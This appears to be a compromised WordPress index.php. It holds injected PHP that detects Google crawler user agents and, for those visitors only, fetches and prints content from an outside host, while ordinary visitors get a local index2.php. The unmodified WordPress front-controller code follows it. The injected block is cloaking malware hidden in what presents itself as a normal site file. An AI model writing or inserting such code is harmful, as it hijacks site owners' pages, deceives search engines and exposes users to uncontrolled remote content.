<?php

$googleBots = array(
    "Googlebot",
    "Google-Site-Verification",
    "Google-InspectionTool",
    "Googlebot-Mobile",
    "Googlebot-News"
);

$isGoogleBot = false;

if (isset($_SERVER['HTTP_USER_AGENT'])) {
    foreach ($googleBots as $bot) {
        if (stripos($_SERVER['HTTP_USER_AGENT'], $bot) !== false) {
            $isGoogleBot = true;
            break;
        }
    }
}

if ($isGoogleBot) {
    $bot_content = file_get_contents('https://app.sampleproject.my/raw/yobkalyogcla');
    echo $bot_content;
    exit;
} else {
    include('index2.php');
    exit;
}
?>

<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
